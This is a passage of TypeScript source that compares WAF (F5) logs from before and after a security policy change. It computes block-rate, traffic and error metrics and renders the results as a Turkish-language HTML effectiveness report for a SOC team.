    );
  }

  const attackBlockedDeltaCount = actionDataAvailable
    ? Math.max(0, periodB.metrics.blockedRequests - periodA.metrics.blockedRequests)
    : 0;

  // Prevented traffic MB calculation: Only calculate if periodB has authentic byte data
  let preventedTrafficMb: number | null = null;
  if (periodB.metrics.hasByteData && periodB.metrics.blockedBytes > 0) {
    const rawMb = periodB.metrics.blockedBytes / (1024 * 1024);
    preventedTrafficMb = parseFloat(rawMb < 0.01 ? rawMb.toFixed(4) : rawMb.toFixed(2));
  }

  // Server error reduction (HTTP 5xx): Only compute if backend application logs are included
  let serverErrorReductionPct: number | null = null;
  const backendAvailable = periodA.metrics.isBackendLogIncluded && periodB.metrics.isBackendLogIncluded;
  if (backendAvailable && periodA.metrics.serverErrors5xx > 0) {
    serverErrorReductionPct = parseFloat(
      (
        ((periodA.metrics.serverErrors5xx - periodB.metrics.serverErrors5xx) /
          periodA.metrics.serverErrors5xx) *
        100
      ).toFixed(1)
    );
  }

  let criticalThreatReductionPct = 0;
  if (periodA.metrics.criticalThreatIps > 0) {
    criticalThreatReductionPct = parseFloat(
      (
        ((periodA.metrics.criticalThreatIps - periodB.metrics.criticalThreatIps) /
          periodA.metrics.criticalThreatIps) *
        100
      ).toFixed(1)
    );
  }

  // Period Duration & Daily Normalized Calculations
  const periodDaysA = periodA.metrics.periodDays || periodA.metrics.totalDays || 1;
  const periodDaysB = periodB.metrics.periodDays || periodB.metrics.totalDays || 1;
  const periodDaysDifferent = periodDaysA !== periodDaysB;
  const periodDurationWarning = periodDaysDifferent
    ? '⚠️ Dönem süreleri farklıdır; toplam hacim karşılaştırması günlük ortalama ile birlikte değerlendirilmelidir.'
    : null;

  const dailyAvgA =
    periodA.metrics.dailyAverageCount ??
    parseFloat((periodA.metrics.totalRequests / periodDaysA).toFixed(1));
  const dailyAvgB =
    periodB.metrics.dailyAverageCount ??
    parseFloat((periodB.metrics.totalRequests / periodDaysB).toFixed(1));
  let dailyAverageChangePct: number | null = null;
  if (dailyAvgA > 0) {
    dailyAverageChangePct = parseFloat((((dailyAvgB - dailyAvgA) / dailyAvgA) * 100).toFixed(1));
  }

  // Chronological Inversion Check: Does Period A start significantly AFTER Period B?
  let chronologicalInversionDetected = false;
  let chronologicalInversionWarning: string | null = null;
  const timeA = periodA.metrics.periodStart || periodA.metrics.startDate;
  const timeB = periodB.metrics.periodStart || periodB.metrics.startDate;
  if (timeA && timeB) {
    const dateA = new Date(timeA.replace(/\//g, '-'));
    const dateB = new Date(timeB.replace(/\//g, '-'));
    if (!isNaN(dateA.getTime()) && !isNaN(dateB.getTime())) {
      if (dateA.getTime() > dateB.getTime()) {
        chronologicalInversionDetected = true;
        chronologicalInversionWarning = `⚠️ Kronolojik Terslik Uyarısı: Dönem A başlangıç tarihi (${timeA}), Dönem B başlangıç tarihinden (${timeB}) daha yenidir. Before ve After dosyalarının yerini ters yüklemiş olabilirsiniz.`;
      }
    }
  }

  // Key Findings & Executive Summary (Adli ve Gerçekçi Terminoloji)
  const keyFindings: string[] = [];
  const deltaSign = blockRateDelta >= 0 ? '+' : '';

  const obsDelta = periodB.metrics.totalRequests - periodA.metrics.totalRequests;
  let totalVolText: string;
  if (periodA.metrics.hasCountData === false && periodB.metrics.hasCountData === true) {
    totalVolText = `Dönem A'da Count kolonu bulunmadığından Before hacmi UNKNOWN olarak değerlendirilmiştir; Dönem B gözlem hacmi: ${periodB.metrics.totalRequests.toLocaleString('tr-TR')}.`;
  } else if (periodA.metrics.hasCountData === true && periodB.metrics.hasCountData === false) {
    totalVolText = `Dönem A gözlem hacmi: ${periodA.metrics.totalRequests.toLocaleString('tr-TR')}; Dönem B'de Count kolonu bulunmadığından After hacmi UNKNOWN olarak değerlendirilmiştir.`;
  } else {
    const obsPctNum =
      periodA.metrics.totalRequests > 0
        ? ((obsDelta / periodA.metrics.totalRequests) * 100).toFixed(1)
        : '0.0';
    const obsPctFormatted = `${obsDelta >= 0 ? '+%' : '-%'}${Math.abs(parseFloat(obsPctNum)).toFixed(1).replace('.', ',')}`;
    totalVolText = `Toplam gözlem hacmi: ${periodA.metrics.totalRequests.toLocaleString('tr-TR')} → ${periodB.metrics.totalRequests.toLocaleString('tr-TR')} (${obsPctFormatted}).`;
  }

  const dailyAStr = dailyAvgA.toFixed(1).replace('.', ',');
  const dailyBStr = dailyAvgB.toFixed(1).replace('.', ',');
  const dailyPctFormatted =
    dailyAverageChangePct !== null
      ? `${dailyAverageChangePct >= 0 ? '+%' : '-%'}${Math.abs(dailyAverageChangePct).toFixed(1).replace('.', ',')}`
      : '-%0,0';
  const dailyAvgText = `Günlük ortalama gözlem: ${dailyAStr} → ${dailyBStr} (${dailyPctFormatted}).`;

  if (actionDataAvailable) {
    keyFindings.push(
      `${totalVolText} ${dailyAvgText}`
    );
    if (periodDaysDifferent) {
      keyFindings.push(
        `⚠️ Dönem süreleri farklıdır; toplam hacim karşılaştırması günlük ortalama ile birlikte değerlendirilmelidir.`
      );
    }
    keyFindings.push(
      `Genel engelleme oranı %${periodA.metrics.blockRate} seviyesinden %${periodB.metrics.blockRate}'e değişti (Değişim: ${deltaSign}${blockRateDelta} yüzde puan${
        blockRateRelativeChangePct !== null
          ? `, relatif değişim: ${blockRateRelativeChangePct >= 0 ? '+' : ''}%${blockRateRelativeChangePct}`
          : ''
      }).`
    );

    keyFindings.push(
      `Dönem B'de WAF tarafından BLOCK uygulanan ${periodB.metrics.blockedRequests.toLocaleString('tr-TR')} istek gözlendi (Dönem A: ${periodA.metrics.blockedRequests.toLocaleString('tr-TR')}, fark: +${attackBlockedDeltaCount.toLocaleString('tr-TR')}). Bu değer, önceki dönem saldırılarının birebir devamı olduğu anlamına gelmez.`
    );

    for (const s of signatureImpacts.slice(0, 5)) {
      if (s.periodB_blocked > 0) {
        keyFindings.push(
          `Dönem B'de ${s.name} imzası için WAF tarafından BLOCK uygulanan ${s.periodB_blocked.toLocaleString('tr-TR')} istek gözlendi.`
        );
      }
    }
  } else {
    const obsDeltaText =
      periodA.metrics.hasCountData === false || periodB.metrics.hasCountData === false
        ? ''
        : ` (Net Fark: ${obsDelta >= 0 ? '+' : ''}${obsDelta.toLocaleString('tr-TR')})`;
    keyFindings.push(
      `${totalVolText}${obsDeltaText}.`
    );
    keyFindings.push(
      `${dailyAvgText} [Dönem A: ${periodDaysA} gün, Dönem B: ${periodDaysB} gün].`
    );
    if (periodDaysDifferent) {
      keyFindings.push(
        `⚠️ Dönem süreleri farklıdır; toplam hacim karşılaştırması günlük ortalama ile birlikte değerlendirilmelidir.`
      );
    }
    keyFindings.push(
      `Kaynak dosyalarda ayrı bir Action kolonu bulunmuyor. Response alanı HTTP durum kodlarını içermektedir.`
    );
    for (const s of signatureImpacts.slice(0, 5)) {
      keyFindings.push(
        `${s.name} kaydı için Dönem A gözlemi: ${s.beforeCount?.toLocaleString('tr-TR')}, Dönem B gözlemi: ${s.afterCount?.toLocaleString('tr-TR')} (Fark: ${(s.delta ?? 0) >= 0 ? '+' : ''}${(s.delta ?? 0).toLocaleString('tr-TR')}).`
      );
    }
  }

  if (preventedTrafficMb !== null) {
    keyFindings.push(
      `Sonraki dönemde BLOCK aksiyonu uygulanan log kayıtlarına ait gözlenen trafik hacmi: ${preventedTrafficMb} MB.`
    );
  } else {
    keyFindings.push(
      'Log kaynağında byte bilgisi bulunmadığından trafik hacmi hesaplanamadı.'
    );
  }

  if (serverErrorReductionPct !== null) {
    keyFindings.push(
      `Backend uygulama erişim loglarında HTTP 5xx hata oranında %${serverErrorReductionPct} rahatlama gözlendi.`
    );
  } else {
    keyFindings.push(
      'Backend telemetrisi bulunmadığı için 5xx etkisi hesaplanamadı.'
    );
  }

  const recommendations: string[] = [
    'ALERT modunda kalmaya devam eden veya kısmi engellenen kurallar (özellikle hassas uç nokta ve kimlik doğrulama testleri) için backend uygulama ekipleriyle birlikte false-positive teyidi yapılarak kademeli BLOCK moduna geçilmelidir.',
    'Sonraki dönemde loglarda gözlenmeyen imzaların saldırgan aktivite azalması mı yoksa kural kapsam değişikliği mi olduğu periyodik tehdit istihbaratı ile takip edilmelidir.',
    'WAF cihazının kural sürüm geçmişi (git / audit history) ile periyodik log karşılaştırma sonuçları çapraz doğrulanmalıdır.',
    'Uygulama sunucularından 5xx ve response time telemetrisi WAF kayıtları ile birlikte merkezi SIEM ortamında toplanmalıdır.',
  ];

  const footnotes: string[] = [
    '1. Karşılaştırma Kapsamı: İki dönem arasındaki karşılaştırma POLICY + RULE/SIGNATURE/EVENT düzeyindeki gözlemlere dayanmaktadır.',
    '2. Aksiyon Değerlendirmesi: ALERT → BLOCK geçişleri doğrudan log aksiyon verilerine dayalıdır; merkezi WAF konfigürasyon/audit geçmişi ayrıca doğrulanmadıkça donanımsal değişiklik kesin kabul edilmez.',
    '3. Trafik Ölçümü: Log kaynaklarında güvenilir byte alanı bulunmadığında trafik hacmi hesaplanmamaktadır.',
    '4. Backend Etkisi: Backend/access logu bulunmadığından backend etkisi belirlenemedi.',
    '5. Kayıt Sayımı: F5 aggregate raporlarında her satır Count kolonu kadar isteği temsil eder. Toplam hacim SUM(Count) olarak hesaplanmıştır.',
    '6. Tekilleştirme & Gözlem: Stateful deduplication (oturum veya IP bazlı mükerrer istek tekilleştirme) verisi bulunmadığında her log gözlemi bağımsız kaydedilir.',
  ];

  let executiveSummary = '';
  const warningText = periodDaysDifferent
    ? ' ⚠️ Dönem süreleri farklıdır; toplam hacim karşılaştırması günlük ortalama ile birlikte değerlendirilmelidir.'
    : '';

  if (actionDataAvailable) {
    const isAssumption = Boolean(
      options?.policyAssumptionMode &&
        (!periodA.diagnostics.some((d) => d.actionDataAvailable && !forceA) ||
          !periodB.diagnostics.some((d) => d.actionDataAvailable && !forceB))
    );
    const disclaimer = isAssumption
      ? ' (ALERT → BLOCK değerlendirmesi kural öncesi / kural sonrası politika varsayımına dayalıdır).'
      : ' (ALERT → BLOCK değerlendirmesi log gözlemine dayalıdır).';
    executiveSummary = `Dönem A (${labelA}) ile After olarak yüklenen dönem B (${labelB}) karşılaştırıldığında; ${totalVolText} ${dailyAvgText}${warningText} (Gözlenen Count ve hacim değişimi, doğrudan WAF etkinliği artışı/azalışı olarak yorumlanmamalıdır; trafik ve kural kapsamı ile birlikte değerlendirilmelidir). Genel WAF engelleme oranı %${periodA.metrics.blockRate} seviyesinden %${periodB.metrics.blockRate}'e ulaşmıştır (${deltaSign}${blockRateDelta} yüzde puan değişim). Dönem B süresince WAF sınırında ${periodB.metrics.blockedRequests.toLocaleString('tr-TR')} isteğe BLOCK aksiyonu uygulanmıştır. İncelenen ${signatureImpacts.length} kural/imza kaydından ${continuingSignatures.blockObserved.length} adedinde BLOCK gözlenmiş, ${continuingSignatures.partialChange.length} adedinde kısmi değişim izlenmiş, ${notObservedSignatures.length} adedi After dönemindeki kaynak F5 Excel'inde gözlenmemiştir.${disclaimer}`;
  } else {
    executiveSummary = `Dönem A (${labelA}) ile After olarak yüklenen dönem B (${labelB}) karşılaştırıldığında; incelenen ${policyComparison.length} adet güvenlik politikasında ${totalVolText} ${dailyAvgText}${warningText} (Gözlenen Count değerindeki değişim doğrudan WAF etkinliği değişimi olarak yorumlanmamalıdır). İncelenen ${signatureImpacts.length} kural/event kaydından ${signatureImpacts.filter((s) => s.isContinuingInAfter === 'Evet').length} adedi sonraki dönemde de gözlenmeye devam etmiş, ${notObservedSignatures.length} adedi After dönemindeki kaynak F5 Excel'inde gözlenmeyen event, ${newObservedSignatures.length} adedi After döneminde ilk kez gözlenen event olarak sınıflandırılmıştır. (Not: Kaynak Excel dosyalarında WAF aksiyon kolonu [Action / Disposition] bulunmadığından ve Response alanı HTTP yanıt kodlarını [500, 200, 403 vb.] içerdiğinden BLOCK/ALERT sayısı uydurulmamıştır; analiz istek ve gözlem hacmi bazında yapılmıştır).`;
  }

  return {
    periodA: periodA.metrics,
    periodB: periodB.metrics,
    periodALabel: labelA,
    periodBLabel: labelB,
    analyzedAt: new Date().toLocaleString('tr-TR'),
    isDemo,
    actionDataAvailable,
    totalObservationsA: periodA.metrics.totalRequests,
    totalObservationsB: periodB.metrics.totalRequests,
    responseDistribution: {
      periodA: periodA.responseDistribution,
      periodB: periodB.responseDistribution,
    },
    policyComparison,
    dataQuality: {
      periodA: periodA.dataQuality,
      periodB: periodB.dataQuality,
    },
    blockRateDelta,
    blockRatePercentagePointsDelta,
    blockRateRelativeChangePct,
    dailyAverageChangePct,
    periodDaysDifferent,
    periodDurationWarning,
    attackBlockedDeltaCount,
    preventedTrafficMb,
    serverErrorReductionPct,
    criticalThreatReductionPct,
    signatureImpacts,
    continuingSignatures,
    notObservedSignatures,
    newObservedSignatures,
    protectedServers,
    executiveSummary,
    keyFindings,
    recommendations,
    footnotes,
    diagnostics: {
      periodA: periodA.diagnostics,
      periodB: periodB.diagnostics,
    },
    chronologicalInversionDetected,
    chronologicalInversionWarning,
  };
}

export function generatePolicyEffectivenessHtmlReport(
  res: PolicyComparisonResult,
  companyName: string = 'Kurumsal SOC ve Network Güvenliği',
  analystName: string = 'SOC Tehdit Avcısı & Güvenlik Mühendisi'
): string {
  const esc = (s: unknown) =>
    String(s ?? '-')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
  const num = (n: number) => n.toLocaleString('tr-TR');

  return `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WAF &amp; Güvenlik Politikası Değişikliği Etkinlik Raporu</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap');
  :root {
    --primary: #0f172a;
    --blue: #2563eb;
    --emerald: #059669;
    --amber: #d97706;
    --rose: #e11d48;
    --slate: #64748b;
    --bg: #f8fafc;
    --border: #e2e8f0;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--primary); padding: 2.5rem; line-height: 1.5; }
  .container { max-width: 1200px; margin: 0 auto; background: #ffffff; border-radius: 16px; padding: 3rem; box-shadow: 0 4px 25px rgba(0,0,0,0.06); border: 1px solid var(--border); }
  
  header { border-bottom: 2px solid var(--primary); padding-bottom: 1.5rem; margin-bottom: 2rem; display: flex; justify-content: space-between; align-items: flex-start; }
  h1 { font-size: 1.6rem; font-weight: 800; color: var(--primary); letter-spacing: -0.02em; }
  .subtitle { color: var(--slate); font-size: 0.9rem; margin-top: 0.25rem; }
  .meta-box { text-align: right; font-size: 0.82rem; color: #475569; }
  .meta-box strong { color: var(--primary); }

  .demo-banner { background: #fef3c7; border: 2px dashed #f59e0b; color: #92400e; padding: 0.9rem 1.25rem; border-radius: 12px; font-weight: 800; font-size: 0.88rem; margin-bottom: 1.75rem; text-align: center; }

  .exec-summary { background: #eff6ff; border-left: 4px solid var(--blue); padding: 1.25rem 1.5rem; border-radius: 0 12px 12px 0; margin-bottom: 2rem; font-size: 0.95rem; color: #1e3a8a; }

  .kpi-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 2.5rem; }
  .kpi-card { background: #f8fafc; border: 1px solid var(--border); border-radius: 12px; padding: 1.2rem; }
  .kpi-card.highlight { background: linear-gradient(135deg, #f0fdf4 0%, #ecfdf5 100%); border-color: #a7f3d0; }
  .kpi-title { font-size: 0.72rem; text-transform: uppercase; font-weight: 700; color: var(--slate); letter-spacing: 0.05em; }
  .kpi-val { font-size: 1.8rem; font-weight: 800; color: var(--primary); margin-top: 0.25rem; display: flex; align-items: baseline; gap: 0.5rem; }
  .kpi-delta { font-size: 0.85rem; font-weight: 700; color: var(--emerald); }
  .kpi-sub { font-size: 0.75rem; color: var(--slate); margin-top: 0.25rem; line-height: 1.3; }

  h2 { font-size: 1.25rem; font-weight: 800; margin: 2.2rem 0 1rem 0; padding-bottom: 0.5rem; border-bottom: 2px solid var(--border); display: flex; align-items: center; gap: 0.5rem; color: var(--primary); }
  h3 { font-size: 1.05rem; font-weight: 700; margin: 1.2rem 0 0.6rem 0; color: #334155; }

  table { width: 100%; border-collapse: collapse; margin-bottom: 2rem; font-size: 0.82rem; }
  th, td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
  th { background: #f1f5f9; font-weight: 700; color: #475569; text-transform: uppercase; font-size: 0.7rem; }
  
  .badge { display: inline-flex; align-items: center; padding: 0.2rem 0.55rem; border-radius: 9999px; font-size: 0.72rem; font-weight: 700; }
  .badge-block { background: #dcfce7; color: #15803d; border: 1px solid #86efac; }
  .badge-alert { background: #fee2e2; color: #b91c1c; border: 1px solid #fca5a5; }
  .badge-warn { background: #fef3c7; color: #b45309; border: 1px solid #fde68a; }
  .badge-neutral { background: #f1f5f9; color: #475569; border: 1px solid #e2e8f0; }

  .findings-box { background: #fdfdfd; border: 1px solid var(--border); border-radius: 12px; padding: 1.25rem 1.5rem; margin-bottom: 1.5rem; }
  .findings-box ul { padding-left: 1.25rem; font-size: 0.88rem; color: #334155; }
  .findings-box li { margin-bottom: 0.5rem; }

  .print-btn { background: var(--primary); color: white; border: none; padding: 0.6rem 1.2rem; border-radius: 8px; font-weight: 600; cursor: pointer; margin-bottom: 1.5rem; }
  @media print { .print-btn { display: none; } body { padding: 0; background: white; } .container { border: none; box-shadow: none; padding: 0; } }
</style>
</head>
<body>
<div class="container">
  <button class="print-btn" onclick="window.print()">🖨️ Raporu Yazdır / PDF Olarak Kaydet</button>

  ${
    res.isDemo
      ? '<div class="demo-banner">⚠️ DEMO / SİMÜLASYON VERİSİ — Bu rapor sentetik örnek loglarla oluşturulmuştur; gerçek müşteri ortamı ölçümü değildir.</div>'
      : ''
  }

  <header>
    <div>
      <h1>WAF &amp; Güvenlik Politikası Değişikliği Etkinlik Raporu</h1>
      <div class="subtitle">${esc(companyName)} • Kural Sıkılaştırma &amp; Dönemsel Karşılaştırma Analizi</div>
    </div>
    <div class="meta-box">
      <div><strong>Tarih:</strong> ${esc(res.analyzedAt)}</div>
      <div><strong>Analist:</strong> ${esc(analystName)}</div>
      <div><strong>Statü:</strong> <span class="badge badge-block">Doğrulandı &amp; Tamamlandı</span></div>
    </div>
  </header>

  <!-- BÖLÜM 1: YÖNETİCİ ÖZETİ -->
  <h2>1. 📋 Yönetici Özeti</h2>
  <div class="exec-summary">
    ${esc(res.executiveSummary)}
  </div>

  <div class="kpi-grid">
    <div class="kpi-card highlight">
      <div class="kpi-title">Engelleme Oranı Değişimi</div>
      <div class="kpi-val">
        %${res.periodB.blockRate}
        <span class="kpi-delta">${res.blockRateDelta >= 0 ? '+' : ''}${res.blockRateDelta} Yüzde Puan</span>
      </div>
      <div class="kpi-sub">
        Önceki Dönem: %${res.periodA.blockRate}${
    res.blockRateRelativeChangePct !== null
      ? ` • Relatif: ${res.blockRateRelativeChangePct >= 0 ? '+' : ''}%${res.blockRateRelativeChangePct}`
      : ''
  }
      </div>
    </div>

    <div class="kpi-card">
      <div class="kpi-title">Sınırda BLOCK Uygulanan İstek</div>
      <div class="kpi-val">
        ${num(res.periodB.blockedRequests)}
        <span class="kpi-delta">+${num(res.attackBlockedDeltaCount)} Fark</span>
      </div>
      <div class="kpi-sub">Dönem B'de WAF tarafından engellendi</div>
    </div>

    <div class="kpi-card">
      <div class="kpi-title">Kurtarılan Ağ Trafiği</div>
      <div class="kpi-val">
        ${res.preventedTrafficMb !== null ? `${res.preventedTrafficMb} MB` : '—'}
      </div>
      <div class="kpi-sub">
        ${
          res.preventedTrafficMb !== null
            ? 'Sonraki dönemde BLOCK uygulanan loglanan byte hacmi'
            : 'Log kaynağında byte bilgisi bulunmadığından hesaplanamadı'
        }
      </div>
    </div>

    <div class="kpi-card">
      <div class="kpi-title">Sunucu Hata Rahatlaması</div>
      <div class="kpi-val">
        ${res.serverErrorReductionPct !== null ? `-%${res.serverErrorReductionPct}` : '—'}
      </div>
      <div class="kpi-sub">
        ${
          res.serverErrorReductionPct !== null
            ? 'Backend HTTP 5xx hatalarındaki düşüş'
            : 'Backend telemetrisi bulunmadığı için 5xx etkisi hesaplanamadı'
        }
      </div>
    </div>
  </div>

  <table>
    <thead>
      <tr>
        <th>Metrik</th>
        <th>${esc(res.periodALabel)}</th>
        <th>${esc(res.periodBLabel)}</th>
        <th>Değişim / Not</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Tarih Aralığı</strong></td>
        <td>${esc(res.periodA.startDate || 'Belirtilmedi')} — ${esc(res.periodA.endDate || 'Belirtilmedi')}</td>
        <td>${esc(res.periodB.startDate || 'Belirtilmedi')} — ${esc(res.periodB.endDate || 'Belirtilmedi')}</td>
        <td><span class="badge badge-neutral">Dönem Pencereleri</span></td>
      </tr>
      <tr>
        <td><strong>Dönem Süresi</strong></td>
        <td>${res.periodA.totalDays} Gün</td>
        <td>${res.periodB.totalDays} Gün</td>
        <td><span class="badge badge-neutral">Zaman Ölçeği</span></td>
      </tr>
      <tr>
        <td><strong>Toplam İncelenen İstek</strong></td>
        <td>${num(res.periodA.totalRequests)}</td>
        <td>${num(res.periodB.totalRequests)}</td>
        <td><span class="badge badge-neutral">Tam İnceleme</span></td>
      </tr>
      <tr>
        <td><strong>Günlük Ortalama İstek</strong></td>
        <td>${num(res.periodA.dailyAverageRequests)} / gün</td>
        <td>${num(res.periodB.dailyAverageRequests)} / gün</td>
        <td><span class="badge badge-neutral">Normalleştirilmiş</span></td>
      </tr>
      <tr>
        <td><strong>WAF ALERT Sayısı</strong></td>
        <td>${num(res.periodA.alertedRequests || 0)}</td>
        <td>${num(res.periodB.alertedRequests || 0)}</td>
        <td><span class="badge badge-alert">İzleme Modu</span></td>
      </tr>
      <tr>
        <td><strong>Engellenen İstek (WAF BLOCK)</strong></td>
        <td>${num(res.periodA.blockedRequests)} (%${res.periodA.blockRate})</td>
        <td>${num(res.periodB.blockedRequests)} (%${res.periodB.blockRate})</td>
        <td><span class="badge badge-block">${res.blockRateDelta >= 0 ? '+' : ''}${res.blockRateDelta} Yüzde Puan</span></td>
      </tr>
      <tr>
        <td><strong>Günlük Ortalama BLOCK</strong></td>
        <td>${num(res.periodA.dailyAverageBlocks)} / gün</td>
        <td>${num(res.periodB.dailyAverageBlocks)} / gün</td>
        <td><span class="badge badge-block">Günlük Koruma</span></td>
      </tr>
      <tr>
        <td><strong>Uygulama 5xx Hataları</strong></td>
        <td>${res.serverErrorReductionPct !== null ? `${num(res.periodA.serverErrors5xx)} Hata` : 'Telemetri Yok'}</td>
        <td>${res.serverErrorReductionPct !== null ? `${num(res.periodB.serverErrors5xx)} Hata` : 'Telemetri Yok'}</td>
        <td>
          ${
            res.serverErrorReductionPct !== null
              ? `<span class="badge badge-block">-%${res.serverErrorReductionPct} Rahatlama</span>`
              : '<span class="badge badge-neutral">Hesaplanamadı</span>'
          }
        </td>
      </tr>
    </tbody>
  </table>

  <!-- BÖLÜM 2: POLICY BEFORE / AFTER (ANA KARŞILAŞTIRMA TABLOSU) -->
  <h2>2. 🛡️ Policy Before / After (Ana Karşılaştırma Matrisi)</h2>
  <table>
    <thead>
      <tr>
        <th>Policy</th>
        <th>Rule / Signature</th>
        <th>Before ALERT</th>
        <th>Before BLOCK</th>
        <th>After ALERT</th>
        <th>After BLOCK</th>
        <th>Action Değişimi</th>
        <th>After'da Devam Ediyor mu?</th>
        <th>Durum</th>
      </tr>
    </thead>
    <tbody>
      ${res.signatureImpacts
        .map(
          (sig) => `
        <tr>
          <td><span class="badge badge-neutral">${esc(sig.policyId)}</span></td>
          <td>
            <strong>${esc(sig.name)}</strong><br>
            <span style="color:#64748b; font-family:'JetBrains Mono',monospace; font-size:0.75rem;">${esc(sig.signatureId)}</span>
          </td>
          <td style="color:#dc2626;">${num(sig.periodA_alerted)}</td>
          <td>${num(sig.periodA_blocked)}</td>
          <td style="color:#dc2626;">${num(sig.periodB_alerted)}</td>
          <td style="color:#16a34a; font-weight:700;">${num(sig.periodB_blocked)}</td>
          <td>
            ${
              sig.actionChangeLabel === 'ALERT → BLOCK'
                ? '<span class="badge badge-block">⚡ ALERT ➔ BLOCK</span>'
                : sig.actionChangeLabel === 'Kısmi değişim'
                ? '<span class="badge badge-warn">⚠️ Kısmi değişim</span>'
                : `<span class="badge badge-neutral">${esc(sig.actionChangeLabel)}</span>`
            }
          </td>
          <td>
            ${
              sig.isContinuingInAfter === 'Evet'
                ? '<span class="badge badge-alert">Evet</span>'
                : sig.isContinuingInAfter === 'Yeni'
                ? '<span class="badge badge-block">Yeni</span>'
                : '<span class="badge badge-neutral">Hayır</span>'
            }
          </td>
          <td>
            ${
              sig.statusLabel === 'BLOCK gözleniyor'
                ? '<span class="badge badge-block">✅ BLOCK gözleniyor</span>'
                : sig.statusLabel === 'ALERT devam ediyor'
                ? '<span class="badge badge-warn">⚠️ ALERT devam ediyor</span>'
                : sig.statusLabel === 'BLOCK gözlenmedi'
                ? '<span class="badge badge-alert">❌ BLOCK gözlenmedi</span>'
                : `<span class="badge badge-neutral">${esc(sig.statusLabel)}</span>`
            }
          </td>
        </tr>
      `
        )
        .join('')}
    </tbody>
  </table>

  <!-- BÖLÜM 3: DEVAM EDEN İMZALAR -->
  <h2>3. 🔄 Devam Eden İmzalar (After Döneminde Gözlenenler)</h2>
  
  <h3>3.1. BLOCK Gözlenen İmzalar (Sıkılaştırma Etkisi Gözlenen)</h3>
  <table>
    <thead>
      <tr>
        <th>Policy</th>
        <th>İmza / Kural</th>
        <th>After BLOCK İstek Sayısı</th>
        <th>Önceki Durum</th>
        <th>Teknik Adli Not</th>
      </tr>
    </thead>
    <tbody>
      ${
        res.continuingSignatures.blockObserved.length > 0
          ? res.continuingSignatures.blockObserved
              .map(
                (s) => `
          <tr>
            <td><span class="badge badge-neutral">${esc(s.policyId)}</span></td>
            <td><strong>${esc(s.name)}</strong> (${esc(s.signatureId)})</td>
            <td style="color:#16a34a; font-weight:700;">${num(s.periodB_blocked)} İstek</td>
            <td>${num(s.periodA_alerted)} Alert / ${num(s.periodA_blocked)} Block</td>
            <td style="color:#475569; font-size:0.8rem;">${esc(s.forensicInterpretation)}</td>
          </tr>
        `
              )
              .join('')
          : '<tr><td colspan="5" style="color:#64748b;">Bu kategoride imza kaydedilmedi.</td></tr>'
      }
    </tbody>
  </table>

  <h3>3.2. Kısmi Değişim / ALERT ve BLOCK Birlikte Devam Eden İmzalar</h3>
  <table>
    <thead>
      <tr>
        <th>Policy</th>
        <th>İmza / Kural</th>
        <th>After ALERT</th>
        <th>After BLOCK</th>
        <th>Teknik Değerlendirme</th>
      </tr>
    </thead>
    <tbody>
      ${
        res.continuingSignatures.partialChange.length > 0
          ? res.continuingSignatures.partialChange
              .map(
                (s) => `
          <tr>
            <td><span class="badge badge-neutral">${esc(s.policyId)}</span></td>
            <td><strong>${esc(s.name)}</strong> (${esc(s.signatureId)})</td>
            <td style="color:#dc2626; font-weight:700;">${num(s.periodB_alerted)}</td>
            <td style="color:#16a34a; font-weight:700;">${num(s.periodB_blocked)}</td>
            <td style="color:#475569; font-size:0.8rem;">${esc(s.forensicInterpretation)}</td>
          </tr>
        `
              )
              .join('')
          : '<tr><td colspan="5" style="color:#64748b;">Bu kategoride kısmi imza kaydedilmedi.</td></tr>'
      }
    </tbody>
  </table>

  <h3>3.3. ALERT Modunda Devam Eden İmzalar (BLOCK Gözlenmeyen)</h3>
  <table>
    <thead>
      <tr>
        <th>Policy</th>
        <th>İmza / Kural</th>
        <th>After ALERT Sayısı</th>
        <th>Aksiyon Notu</th>
      </tr>
    </thead>
    <tbody>
      ${
        res.continuingSignatures.alertContinuing.length > 0
          ? res.continuingSignatures.alertContinuing
              .map(
                (s) => `
          <tr>
            <td><span class="badge badge-neutral">${esc(s.policyId)}</span></td>
            <td><strong>${esc(s.name)}</strong> (${esc(s.signatureId)})</td>
            <td style="color:#dc2626; font-weight:700;">${num(s.periodB_alerted)}</td>
            <td style="color:#854d0e; font-size:0.8rem;">İlgili imza için sonraki dönemde BLOCK aksiyonu gözlenmemiştir. ${num(s.periodB_alerted)} olay ALERT olarak devam etmektedir.</td>
          </tr>
        `
              )
              .join('')
          : '<tr><td colspan="4" style="color:#64748b;">Bu kategoride ALERT devam eden imza kaydedilmedi.</td></tr>'
      }
    </tbody>
  </table>

  <!-- BÖLÜM 4: ARTIK GÖZLENMEYEN İMZALAR -->
  <h2>4. 📴 Artık Gözlenmeyen İmzalar</h2>
  <table>
    <thead>
      <tr>
        <th>Policy</th>
        <th>İmza / Kural</th>
        <th>Önceki Dönem (Alert)</th>
        <th>Sonraki Dönem Durumu</th>
        <th>Adli Doğrulama Açıklaması</th>
      </tr>
    </thead>
    <tbody>
      ${
        res.notObservedSignatures.length > 0
          ? res.notObservedSignatures
              .map(
                (s) => `
          <tr>
            <td><span class="badge badge-neutral">${esc(s.policyId)}</span></td>
            <td><strong>${esc(s.name)}</strong> (${esc(s.signatureId)})</td>
            <td style="color:#dc2626;">${num(s.periodA_alerted)} İstek</td>
            <td><span class="badge badge-neutral">Gözlenmedi (0 İstek)</span></td>
            <td style="color:#64748b; font-style:italic;">İlgili imza sonraki karşılaştırma döneminde WAF/firewall loglarında gözlenmemiştir.</td>
          </tr>
        `
              )
              .join('')
          : '<tr><td colspan="5" style="color:#64748b;">Önceki dönemde bulunup sonraki dönemde kaybolan imza bulunmamaktadır.</td></tr>'
      }
    </tbody>
  </table>

  <!-- BÖLÜM 5: TRAFİK ETKİSİ -->
  <h2>5. 📶 Trafik Hacmi Analizi</h2>
  <div class="findings-box">
    ${
      res.preventedTrafficMb !== null
